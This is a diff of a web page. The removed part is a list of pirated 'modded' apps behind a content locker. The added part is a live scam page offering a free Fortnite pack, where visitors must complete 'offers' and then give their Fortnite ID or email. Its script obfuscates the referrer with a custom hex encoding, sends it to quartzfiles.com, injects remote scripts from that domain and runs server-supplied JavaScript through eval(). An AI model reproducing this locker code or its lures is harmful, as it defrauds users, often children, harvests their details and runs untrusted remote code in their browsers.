-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-
-				<li class="searchApp" data-name="Spotify++.gz" data-app="Spotify++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/22695997ecc87bc5e5420b1f2a2281f4.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">SpotifyMod Ltd</div>
-							<span class="app">Spotify++</span>
-							<div class="description">Free Spotify Premium!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="The Sims Freeplay++.gz" data-app="The Sims Freeplay++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/QQabcCR.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">ArchTeam</div>
-							<span class="app">The Sims Freeplay++</span>
-							<div class="description">Unlimited Simoleons, Lifestyle Points, Money & More!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-			    <li class="searchApp" data-name="TikTok Likes++.gz" data-app="TikTok Likes++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/EJN5TxV.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">TikMod Ltd</div>
-							<span class="app">TikTok Likes++</span>
-							<div class="description">Free Likes!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="TikTok++.gz" data-app="TikTok++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/EJN5TxV.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">TikMod Ltd</div>
-							<span class="app">TikTok++</span>
-							<div class="description">Unlock all features!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				
-			     <li class="searchApp" data-name="Tinder.gz" data-app="Tinder" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/R9jMHHH.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">TinderMod Ltd</div>
-							<span class="app">Tinder Gold</span>
-							<div class="description">Free Gold & All Features!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="TocaLifeWorld++.gz" data-app="Toca Life World" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/D5RaxbL.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">TocaTeam</div>
-							<span class="app">Toca Life World</span>
-							<div class="description">Unlocked All Locations & Secret Crumpes!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="TutuAppVIP.gz" data-app="TutuApp VIP" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/ofeuULY.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">TutuTeam</div>
-							<span class="app">TutuApp VIP</span>
-							<div class="description">Free download with VIP</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="Unc0ver.gz" data-app="Unc0ver" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/dWgFEoV.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">Unc0ver Team</div>
-							<span class="app">Unc0ver</span>
-							<div class="description">Jailbreak any iOS devices!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="WATCHED++.gz" data-app="WATCHED++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/a9782a64ab0a36523f701335080f98d2.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">ArchTeam</div>
-							<span class="app">WATCHED++</span>
-							<div class="description">Access to All Shows & Movies!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="Webtoon++.gz" data-app="Webtoon++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/t8ak0Iw.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">ArchTeam</div>
-							<span class="app">Webtoon++</span>
-							<div class="description">Free Fast Pass & Unlimited Coins!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="YoutubeVanced.gz" data-app="YoutubeVanced" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/jU4xpyb.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">ArchTeam</div>
-							<span class="app">Youtube Vanced</span>
-							<div class="description">Youtube Vanced for iOS & Android devices!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="Video Star++.gz" data-name="AgentA.gz" data-app="Video Star++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/lrfTExg.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">Arch Team</div>
-							<span class="app">Video Star++</span>
-							<div class="description">All Packs/Effects & More Features!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				
-				<li class="searchApp" data-name="VSCO++.gz" data-app="VSCO++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="img/eGtUkNd.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">VSMod ltd</div>
-							<span class="app">VSCO++</span>
-							<div class="description">Yearly VSCO Membership For Free!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-						</a>
-				</li>
-				
-				<li class="searchApp" data-name="Candy Crush++.gz" data-name="AgentA.gz" data-app="Candy Crush++" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="https://bit.ly/30qacdY" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">Arch Team</div>
-							<span class="app">Candy Crush++</span>
-							<div class="description">Candy Crush Hack!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-					<li class="searchApp" data-name="Poppy Playtime Mobile.gz" data-name="AgentA.gz" data-app="Poppy Playtime Mobile" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="https://i.imgur.com/kNZnIad.jpg" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">Cmrocket Team</div>
-							<span class="app">Poppy Playtime Mobile</span>
-							<div class="description">Full Game for iOS & Android Devices!!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-					</a>
-				</li>
-				<li class="searchApp" data-name="yalla ludo.gz" data-name="AgentA.gz" data-app="Yalla Ludo Hack" data-url="YOUR LOCKER HERE">
-					<a>
-						<div class="avatar"><img class="app-img" src="https://i.postimg.cc/FRCcq2z1/unnamed.png" alt="avatar" /></div>
-						<div class="textdesc">
-							<div class="name">yalla ludo</div>
-							<span class="app">Yalla Ludo Hack</span>
-							<div class="description">Yalla Ludo Hack!!</div>
-						</div>
-						<div class="righticon"><i class="fas fa-chevron-right"></i></div>
-						</a>
-				</li>
-			</ul>
-		</div>
-	</div>
+		
+	var doc_ref = document.referrer;
 	
-	<footer class="footer">
-		<a href="#"><i class="fas fa-home"></i></a>
-	</footer>
+	var main_min = 5;
+	var main_max = 126;
+	
+	function hex_encode(string) {
+		var char_vals = [];
 
-	<!-- jQuery -->
-	<script src="js/jquery.min.js"></script>
-	<script src="js/modernizr.js"></script>
-	<script type="text/javascript" src="js/bootstrap.min.js"></script>
-	<script type="text/javascript" src="js/all.min.js"></script>
-	<script type="text/javascript" src="js/custom.min.js"></script>
-</body>
+		min = main_min;
+		max = main_max;
 
+		for (var i = 0;i < string.length;i++) {
+			var x = string.charCodeAt(i);
+			char_vals[i] = x;
+		}
 
-<!-- Mirrored from ogapps.club/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 03 Oct 2021 14:55:22 GMT -->
-</html>
+		var range = (max-min)+1;
+		var mid = Math.floor(range/2);
+		var move = mid;
+
+		for (var i = 0;i < char_vals.length;i++) {
+			char_vals[i] -= min;
+			char_vals[i] += move;
+			if (char_vals[i] >= range) {
+				char_vals[i] -= range;
+			}
+		}
+		var block_len = 2;
+		var block_range = 16*16;
+		var hex_str = '';
+		for (var i = 0;i < char_vals.length;i++) {
+			var hex = char_vals[i].toString(16);
+			if (hex.length < block_len) {
+				hex = '0' + hex;
+			}
+			hex_str += hex;
+			
+		}
+		return hex_str;
+	}
+	function hex_decode(string) {
+		var min = main_min;
+		var max = main_max;
+		var char_vals = [];
+		var range = (max-min)+1;
+		var mid = Math.floor(range/2);
+		var move = mid;
+		var decoded_str = '';
+		var block_len = 2;
+		var block_range = 16*16;
+
+		for (var h = 0;h < string.length;h+=block_len) {
+			var slice = string.substr(h,block_len);
+			var i = char_vals.length;
+			char_vals[i] = parseInt(slice, 16);
+			char_vals[i] -= move;
+			if (char_vals[i] < 0) {
+				char_vals[i] += range;
+			}
+			char_vals[i] += min;
+			
+			decoded_str += String.fromCharCode(char_vals[i]);
+		}
+		return decoded_str;
+	}
+	var a = 490;
+var b = 1238277;
+var c = 603;
+var d = 17;
+var e = 296760;
+var f = 1093;
+var g = 'a';
+var h = '412632322e7267672f331f30323824272a233166212d2b67696a6b6f6f706f';
+var p = '6e717041414141';
+	var forced_stop_check = false;
+	
+	var encoded = p+hex_encode(a+"\t"+b+"\t"+c+"\t"+d+"\t"+e+"\t"+f+"\t"+g+"\t"+doc_ref)+h+hex_encode('\t200');
+	var decoded = hex_decode(encoded);
+			var tracking_id = '';
+									
+			var dref = 0;		
+			var last_dref_id = null;
+					var redisplay_items = false;
+					var items_autoshow = false; 
+	
+					
+					function update_inline_data() {
+						
+						if (forced_stop_check == true) {
+														return;
+						}
+						
+						
+						var ts = Math.floor(Date.now()/1000);
+						var script = document.createElement("script"); 
+					    script.type = 'text/javascript'; 
+					    script.async = true;
+					    script.id = 'preld'+(++dref);
+					    
+					    script.src = "https:\/\/quartzfiles.com\/common\/preload.php?a=1&t="+ts+'&lkt=3&r='+(dref)+(l_val ? '&l_val=1' : '')+'&dat='+encoded;
+					    
+					    var script_tags = document.getElementsByTagName("script");
+					    if (script_tags.length != 0) {
+						    var s = document.getElementsByTagName("script")[0];
+						    s.parentNode.insertBefore(script, s);
+					    } else {
+					    	var head_tags = document.getElementsByTagName("head");
+					    	if (head_tags.length != 0) {
+							    var h = document.getElementsByTagName("head")[0];
+							    h.parentNode.insertBefore(script, h);
+					    	} else {
+						    	var html_tags = document.getElementsByTagName("html");
+						    	if (html_tags.length != 0) {
+								    var h = document.getElementsByTagName("html")[0];
+								    h.appendChild(script);
+						    	} 
+					    	}
+					    }
+						
+						if (last_dref_id !== null) {
+							jQuery("#"+last_dref_id).remove();
+						}
+						last_dref_id = script.id;
+						safe_for_reload = true;
+					}
+					
+					var inline_html_init = false;
+					
+					var noa_fcn = null;
+					var pca_fcn = null;
+					var cmp_fcn = null;
+					
+					function update_inline_html(data) {
+												if (has_been_closed) {
+														return;
+						}
+							
+						var mainText = jQuery("#dynheader");
+						var mainDiv = jQuery("#offerlst");
+						if (data !== undefined) {
+							dataCache = data;
+						}
+							
+						var has_items = false;
+						if (data.items != undefined && data.items.length != undefined && data.items.length > 0) {
+							has_items = true;
+						}
+						if (data.t_val !== undefined) {
+							t_val = data.t_val;
+						}
+						
+						if (data.multi !== undefined) {
+							var completed_leads = 0;
+		
+							if (data.multi.completed !== undefined) {
+								completed_leads = data.multi.completed;
+							}
+							if (completed_leads >= 0 && has_items == false) {
+								c_ext = '&c='+completed_leads;
+							}
+							if (completed_leads >= 0) {
+								if (data.multi.count != undefined && data.multi.count > 0) {
+									m_ext = '&m='+data.multi.count;
+								}
+								if (data.multi.count != undefined && data.multi.count > 1) {
+									if (completed_leads >= data.multi.count) {
+										check_lead();
+									}
+								}
+								if (completed_leads > 0 && (data.items == undefined || data.items.length == undefined) || data.items.length == 0) {
+									check_lead();
+								}
+							}
+						
+							if (completed_leads == 0 && mainText.html() != data.multi.message0) {
+								mainText.html(data.multi.message0);
+							} else if (completed_leads == 1 && mainText.html() != data.multi.message1) {
+								mainText.html(data.multi.message1);
+							} else if (completed_leads == 2 && mainText.html() != data.multi.message2) {
+								mainText.html(data.multi.message2);
+							}
+						}
+				
+												var help_txt = '<div class="offer_help_text" style="font-weight: bold;">'+box_text+'</div>';
+						if (typeof data.partial_js !== 'undefined') {
+				
+							pca_fcn = function() {
+								try {
+								    eval(data.partial_js);
+								} catch (e) {
+									console.log( e );
+								}
+							};
+								
+						} else if (typeof data.partial_message !== 'undefined') {
+							pca_fcn = function() {
+								try {
+								    completion_notice(data.partial_message);
+								} catch (e) {
+									console.log( e );
+								}
+							};
+						}
+				
+						if (typeof data.complete_url !== 'undefined') {
+							cmp_fcn = function() {
+								has_been_closed = true;
+								try {
+									if (top.location.href != data.complete_url) {
+								    	top.location.href = data.complete_url;
+								  }
+								} catch (e) {
+									console.log( e );
+								}
+							};
+						}
+						if (typeof data.no_offers_url !== 'undefined') {
+											
+							if (typeof data.complete === 'undefined' || data.complete != true){
+								
+								noa_fcn = function() {
+									top.location.href = data.no_offers_url;
+								};
+								
+							}
+						} else if (typeof data.no_offers_js !== 'undefined') {
+
+							noa_fcn = function() {
+								try {
+								    eval(data.no_offers_js);
+								} catch (e) {
+									console.log( e );
+								}
+							};
+					
+							
+						}
+						var rows = [];	
+						if (has_items) {
+							for (var i = 0;i < data.items.length;i++) {
+								var item = data.items[i];
+								var target_url = item.url;
+								if (target_url.search('tracking_id') == -1 && tracking_id != '' && tracking_id != null) {
+									target_url += '&tracking_id='+tracking_id;
+								}
+								var row = '<p class="each_p_elm" style="text-align: center;">'+
+				    								    					'<a class="tip_over_link link_a" title="'+item.desc+'" onclick="Start_Ajax();" target="'+item.target+'" href="'+target_url+'">'+item.name+'</a>'+
+				    								    			'</p>';
+				    			rows.push(row);
+							}
+							
+
+							jQuery('#offerlst').html(help_txt+rows.join(''));
+						
+							if (items_autoshow || redisplay_items) {
+								jQuery('.dl_button').hide();
+								jQuery('#offerwait').hide();
+								jQuery('#offerload').hide();
+								jQuery('#offerlst').show();
+								redisplay_items = false;
+							}
+									
+						} else {
+
+							var no_offers_msg;
+							
+							if (typeof data.no_offers_message !== 'undefined') {
+								no_offers_msg = data.no_offers_message;
+								
+								jQuery('#offerlst').html(help_txt+'<p class="link_a" style="margin: 2px; text-align: center;">'+no_offers_msg+'<br/></p>');
+								forced_stop_check = true;						
+								
+								jQuery('.offer_help_text').hide();
+								jQuery('.dl_button').hide();
+								jQuery('#offerwait').hide();
+								jQuery('#offerload').hide();
+								jQuery('#offerlst').show();								
+								
+								
+							}
+						}
+						
+						
+						inline_html_init = true;
+						
+						if (noa_fcn !== null) {
+														noa_fcn();
+						}
+						if (pca_fcn !== null) {
+														pca_fcn();
+						}
+						if (cmp_fcn !== null) {
+														cmp_fcn();
+						}
+										
+										
+										
+										
+						
+						
+					}
+					
+					
+					
+									</script>
+								<script language="JavaScript">
+					var setcheckintval = 0;
+					var jQueryLoaded = false;
+					var dataLoaded = false;
+					var itemsDisplayed = false;
+					var check_timeout = 2500;
+					
+					function setcheckintv() {
+						setcheckintval++;
+						
+						jQueryLoaded = (typeof jQuery !== 'undefined' ? true : false);
+						
+						if (jQueryLoaded) {
+							itemsDisplayed = (jQuery("#offerlst p").length >= 1) ? true : false;
+						}
+						dataLoaded = (typeof preload_data !== 'undefined' ? true : false);
+						
+						if (has_been_closed) {
+										
+							return;
+						}
+						if ((first_click_ajax) || jQueryLoaded && dataLoaded && itemsDisplayed) {
+														if (setcheckintval > 1) {
+								//required more than 1 failsafe to load correctly
+								update_status_check();
+							}
+						} else if (jQueryLoaded && dataLoaded && itemsDisplayed == false) {
+							if (setcheckintval < 3) {
+																update_inline_html(preload_data);
+								setTimeout(setcheckintv,check_timeout);
+							} else {
+																update_status_check();
+							}
+							
+						} else if (dataLoaded == false) {
+							
+							if (setcheckintval < 2) {
+																update_inline_data();
+								setTimeout(setcheckintv,check_timeout);
+							} else {
+																update_status_check();
+							}
+						}
+						
+					}
+					function update_status_check() {
+						var flags = (jQueryLoaded ? '1' : '0') + (dataLoaded ? '1' : '0') +(itemsDisplayed ? '1' : '0');
+						var img = new Image();
+						img.src = "https://quartzfiles.com/common/dom_update.php?t=1667561896&lid=1237787"+'&flags='+flags+'&intv='+setcheckintval;
+					}
+				
+					setTimeout(setcheckintv,check_timeout);
+				
+				</script>
+								
+				
+								<link href='https://fonts.googleapis.com/css?family=Concert+One' rel='stylesheet' type='text/css'>
+				<style>
+					/* ===== Tipsy ===== */
+			
+					.tipsy { padding: 4px; font-size: 11px; position: absolute; z-index: 100000; }
+		
+					.tipsy-inner { padding: 5px 7px 5px 8px; background-color: black; color: white; max-width: 300px; text-align: center; }
+					.tipsy-inner { border-radius: 3px; -moz-border-radius:3px; -webkit-border-radius:3px; }
+					.tipsy-arrow { position: absolute; background: url('https://quartzfiles.com/images/tipsy.gif') no-repeat top left; width: 9px; height: 5px; }
+					.tipsy-w { margin-left: 5px; }
+					.tipsy-w .tipsy-arrow { top: 50%; margin-top: -4px; left: 0; width: 5px; height: 9px; }
+		
+					body{
+						background-color:white;
+						font-size: 14px;
+					}
+					#offerlst{
+						font-size: 16px;
+					}
+					
+					.offerlst{
+			
+						background-color:rgba(239,239,239,0.5);
+						
+						border:1px solid white;
+						padding:20px;
+						border-radius:8px;
+						
+						min-height: 80px;
+						margin-bottom: 8px;
+						font-size: 16px;
+					}
+					.link_a, .link_a:link{
+						
+						
+						background-color: #F5F5F5;
+					    background-image: linear-gradient(to bottom, #FFFFFF, #E6E6E6);
+					    background-repeat: repeat-x;
+					    border-color: rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.1) #B3B3B3;
+					    border-image: none;
+					    border-radius: 4px 4px 4px 4px;
+					    border-style: solid;
+					    border-width: 1px;
+					    box-shadow: 0 1px 0 rgba(255, 255, 255, 0.2) inset, 0 1px 2px rgba(0, 0, 0, 0.05);
+					    color: #333333;
+					    cursor: pointer;
+					    display: inline-block;
+					    line-height: 20px;
+					    margin-bottom: 0;
+					    padding: 4px 12px;
+					    text-align: center;
+					    text-shadow: 0 1px 1px rgba(255, 255, 255, 0.75);
+					    vertical-align: middle;
+		
+						font-weight: normal;
+						text-decoration:none;
+		
+						
+						
+					}
+					
+					.link_a:hover{
+						background-position: 0 -15px;
+					    transition: background-position 0.1s linear 0s;
+					}
+					.each_p_elm{
+						margin: 3px 0;
+		
+						padding: 3px;
+						white-space:nowrap;
+					}
+
+				</style>
+									
+					<style>
+						/* custom css */
+						body {
+    margin: 0px;
+    color: #444;
+    font-family: 'Dosis', sans-serif;
+}
+#head {
+    background: #F1F1F1;
+    width: 100%;
+    min-height: 300px;
+    margin-top: 30px;
+}
+#wrap {
+    max-width: 900px;
+    padding: 10px;
+    margin: 0px auto;
+}
+#item {
+    width: 100%;
+    max-width: 300px;
+    float: left;
+    padding: 20px;
+}
+#body {} #a {
+    width: 250px;
+    margin: 5px;
+    min-height: 50px;
+    float: left;
+    padding: 0px 10px;
+}
+#b {
+    width: 250px;
+    margin: 5px;
+    min-height: 50px;
+    float: left;
+    padding: 0px 10px;
+}
+#c {
+    width: 250px;
+    margin: 5px;
+    min-height: 50px;
+    float: left;
+    padding: 0px 10px;
+}
+button {
+    background: #FEAD39;
+    border: 1px solid #ED9C28;
+    padding: 10px;
+    border-radius: 8px;
+    color: #fff;
+    font-size: 18px;
+}
+button:hover {
+    background: #ED9C28
+}							
+					</style>
+					
+				<title>FORTNITE-VBUCKS</title>
+			</head>
+			<body id="the_body" style="margin:0; height:100%; font-family: 'Concert One', sans-serif;">
+												
+				<!--Begin -->
+				<link href="https://fonts.googleapis.com/css?family=Dosis:300,400" rel='stylesheet' type='text/css'>
+
+<div id="head">
+ <div id="wrap">
+
+ <center><img src="https://i.imgur.com/GnxWofg.jpeg" id="item">
+ </center>
+
+ <div style="width:500px;float:left" id="box">
+
+ <h1>Enter to win a Fortnite - Checkered Past Pack</h1>
+
+ <p>Hi Everyone, We are giving away Fortnite - Checkered Past Pack for FREE Until Nov 4th, 2022. All you have to do is participate by completing one offer below.</p>
+
+ <br>
+
+ <p>After Completion, You will be prompted to Enter your Fortnite ID / EMAIL.</p>
+
+ <br>
+
+ <center>				<center>
+					<button onclick="jQuery(this).hide(); jQuery('#offerlst').show('slow');" type="button" class="btn btn-danger btn-large dl_button"><i class="glyphicon glyphicon-download-alt"></i><span id="btn_text"> ENTER TO WIN</span></button>
+					<div id="offerlst" style="display:none;">
+						
+			    	</div>
+			    						<div id="offerwait" style="margin: 50px 0; font-size: 15px; display: none;">
+			    		<p style="margin: 2px; ">
+			    			<span onclick="Back_Ajax();" style="cursor:pointer;">
+				    			<img style="vertical-align: middle;" src="https://quartzfiles.com/images/back.png">
+				    			<span style="text-decoration: underline; font-weight: bold;">Go Back and try a different offer.</span>
+			    			</span><br/>
+			    			<img style="vertical-align: middle;" src="https://quartzfiles.com/common/loader.gif"> Waiting for offer completion..
+			    		</p>
+			    	</div>
+			    </center>
+				</center>
+
+ <br>
+
+ <p>All entries will be raffled and electronically drawn every Sunday 10:00 AM EST. Winners will be contacted via tiktok.</p>
+
+ <br>
+
+ <p>Total Entries : <b>241</b>
+ </p>
+ </div>
+ <div style="clear:both"></div>
+ </div>
+</div>
+
+<div id="body">
+ <div id="wrap">
+ <div id="a">
+ <h1>Step 1</h1>
+ <p>Click the button above and select an offer available in your region. If there were no offer to come out, Please disable your adblocker software or plugin.</p>
+ </div>
+ <div id="b">
+ <h1>Step 2</h1>
+ <p>Complete the offer with valid Information. Offers can be completed 1-2 minutes depends on your internet connection.</p>
+ </div>
+ <div id="c">
+ <h1>Step 3</h1>
+ <p>After Completion, You will be prompted to Enter your Fortnite ID / EMAIL. Winners will be posted on our tiktok fanpage as well.</p>
+ </div>
+ <div style="clear:both"></div>
+
+ <hr/>
+
+ <p>Participants who complete all 3 steps mentioned above will be entered to win the prize shown. This is an independent drawing. This website may or may not be endorsed or affiliated with the brands mentioned above.
+ <br/>
+ <br/> All winners are randomly drawn and then contacted via tiktok to collect their prize. Shipping information is required after completing an offer. The information collected from tiktok for all drawings is securely stored. Have fun and good luck!</p>
+
+ <hr/>
+
+ <a onclick="$('#link_terms').fadeIn(1000);" style="box-sizing: border-box; color: rgb(17, 85, 204); text-decoration: none; cursor: pointer;">Terms</a><span class="Apple-converted-space"> </span>|<span class="Apple-converted-space"> </span><a onclick="$('#link_privacy').fadeIn(1000);" style="box-sizing: border-box; color: rgb(17, 85, 204); text-decoration: none; cursor: pointer;">Privacy</a><span class="Apple-converted-space"> </span>|<span class="Apple-converted-space"> </span><a onclick="$('#link_dmca').fadeIn(1000);" style="box-sizing: border-box; color: rgb(17, 85, 204); text-decoration: none; cursor: pointer;">DMCA</a>
+
+ <p style="float:right">Copyright ©. All rights reserved.</p>
+
+ </div>
+</div>
+
+<script src="https://code.jquery.com/jquery-1.0.1.min.js"></script>
+
+<script>
+ if ($(window).width() < 900) {
+ $("#a").css("width", "100%");
+ $("#b").css("width", "100%");
+ $("#c").css("width", "100%");
+ $("#box").css("width", "100%");
+ $("#item").css("float", "none");
+ } else if ($(window).width() < 500) {
+ $("#item").css("max-width", "500px");
+ } else {
+ $("#a").css("width", "250px");
+ $("#b").css("width", "250px");
+ $("#c").css("width", "250px");
+ $("#item").css("max-width", "300px");
+ $("#box").css("width", "500px");
+ $("#item").css("float", "left");
+ }
+
+ $(window).resize(function() {
+ if ($(window).width() < 900) {
+ $("#a").css("width", "100%");
+ $("#b").css("width", "100%");
+ $("#c").css("width", "100%");
+ $("#box").css("width", "100%");
+ $("#item").css("float", "none");
+ } else if ($(window).width() < 500) {
+ $("#item").css("max-width", "500px");
+ } else {
+ $("#a").css("width", "250px");
+ $("#b").css("width", "250px");
+ $("#c").css("width", "250px");
+ $("#item").css("max-width", "300px");
+ $("#box").css("width", "500px");
+ $("#item").css("float", "left");
+ }
+ });
+
+ $('head').append('<meta name="viewport" content="width=device-width, initial-scale=1 maximum-scale=1"></meta>');
+</script>				<!--End -->
+				
+				<div id="link_terms" title="Terms" style="z-index: 9; display:none; width:50%; position:absolute; left: 25px; top:20px; overflow: visible !important;">
+					<div style="font-size:11px; position: relative; padding:5px; background-color:white; color:black; border:2px solid black; border-radius: 5px;">
+						<center><button onclick="jQuery('#link_terms').hide('fast');">Close Window</button></center>
+						<br/>
+						<br/>
+						<strong>Terms and Conditions of Use</strong><br/>
+						By accessing this site, you agree to be bound by these Terms and Conditions of Use, all applicable laws and regulations, and agree that you are responsible for compliance with any applicable local laws. If you do not agree with any of these terms, you are prohibited from using or accessing this site. The materials contained in this web site are protected by applicable copyright and trade mark laws.
+						<br/>
+						<br/>
+						Permission is granted to temporarily download one copy of the materials (information or software) on this site for personal, non-commercial viewing only. This is the grant of a license, not a transfer of title, and under this license you may not:
+						<br/>
+						modify or copy the materials;<br/>
+						use the materials for any commercial purpose, or for any public display (commercial or non-commercial);<br/>
+						attempt to decompile or reverse engineer any software contained on this site;<br/>
+						remove any copyright or other proprietary notations from the materials; or
+						transfer the materials to another person or "mirror" the materials on any other server.<br/>
+						This license shall automatically terminate if you violate any of these restrictions and may be terminated by site at any time. Upon terminating your viewing of these materials or upon the termination of this license, you must destroy any downloaded materials in your possession whether in electronic or printed format.
+						<br/>
+						<br/>
+						Disclaimer:<br/>
+						The materials on this site are provided "as is". this site makes no warranties, expressed or implied, and hereby disclaims and negates all other warranties, including without limitation, implied warranties or conditions of merchantability, or non-infringement of intellectual property or other violation of rights. Further, this site does not warrant or make any representations concerning the accuracy, likely results, or reliability of the use of the materials on its Internet web site or otherwise relating to such materials or on any sites linked to this site.
+						<br/>
+						<br/>
+						Limitations:<br/>
+						In no event shall this site or its suppliers be liable for any damages (including, without limitation, damages for loss of data or profit, or due to business interruption,) arising out of the use or inability to use the materials on this site, even if this site or an authorized representative has been notified orally or in writing of the possibility of such damage. Because some jurisdictions do not allow limitations on implied warranties, or limitations of liability for consequential or incidental damages, these limitations may not apply to you.
+						<br/>
+						<br/>
+						Revisions:<br/>
+						The materials appearing on this site could include technical, typographical, or photographic errors. this site does not warrant that any of the materials on its web site are accurate, complete, or current. this site may make changes to the materials contained on its web site at any time without notice. this site does not, however, make any commitment to update the materials.
+						<br/>
+						<br/>
+						Links:<br/>
+						this site has not reviewed all of the sites linked to its Internet web site and is not responsible for the contents of any such linked site. The inclusion of any link does not imply endorsement by this site. Use of any such linked web site is at the user's own risk.
+						<br/>
+						<br/>
+						Terms of Use Modifications:<br/>
+						This site may revise these terms of use for its web site at any time without notice. By using this web site you are agreeing to be bound by the then current version of these Terms and Conditions of Use.
+						<br/><br/>
+						Governing Law:<br/>
+						Any claim relating to this site shall be governed by the laws of the State of Nevada without regard to its conflict of law provisions.
+						<br/><br/>
+						<center><button onclick="jQuery('#link_terms').hide('fast');">Close Window</button></center>
+					</div>
+				</div>
+				<div id="link_privacy" title="Privacy" style="z-index: 9; display:none; width:50%; position:absolute; left: 25px; top:20px; overflow: visible !important;">
+					<div style="font-size:11px; position: relative; padding:5px; background-color:white; color:black; border:2px solid black; border-radius: 5px;">
+						<center><button onclick="jQuery('#link_privacy').hide('fast');">Close Window</button></center>
+						<br/>
+						<br/>
+						<strong>Privacy Policy</strong><br/>
+						<br/>
+						Your privacy is important to us. Accordingly, we have developed this Policy in order for you to understand how we collect, use, communicate and disclose and make use of your personal information. The following outlines our privacy policy.
+						<br/>
+						Before or at the time of collecting personal information, we will identify the purposes for which information is being collected.<br/>
+						We will collect and use personal information solely with the objective of fulfilling those purposes specified by us and for other compatible purposes, unless we obtain the consent of the individual concerned or as required by law.<br/>
+						We will only retain personal information as long as necessary for the fulfillment of those purposes.<br/>
+						We will collect personal information by lawful and fair means and, where appropriate, with the knowledge or consent of the individual concerned.<br/>
+						Personal data should be relevant to the purposes for which it is to be used, and, to the extent necessary for those purposes, should be accurate, complete, and up-to-date.<br/>
+						We will protect personal information by reasonable security safeguards against loss or theft, as well as unauthorized access, disclosure, copying, use or modification.<br/>
+						We will make readily available to customers information about our policies and practices relating to the management of personal information.<br/>
+						We are committed to conducting our business in accordance with these principles in order to ensure that the confidentiality of personal information is protected and maintained.
+						<br/><br/>
+						<center><button onclick="jQuery('#link_privacy').hide('fast');">Close Window</button></center>
+					</div>
+				</div>
+				<div id="link_dmca" title="DMCA" style="z-index: 9; display:none; width:50%; position:absolute; left: 25px; top:20px; overflow: visible !important;">
+					<div style="font-size:11px; position: relative; padding:5px; background-color:white; color:black; border:2px solid black; border-radius: 5px;">
+						<center><button onclick="jQuery('#link_dmca').hide('fast');">Close Window</button></center>
+						<br/>
+						<br/>
+						<strong>DMCA &amp; Compliance Policy</strong><br/><br/>
+						<strong>We do not host any files or content on our servers</strong>! Please report copyright infringment in accordance with the details below:
+						<br/><br/>
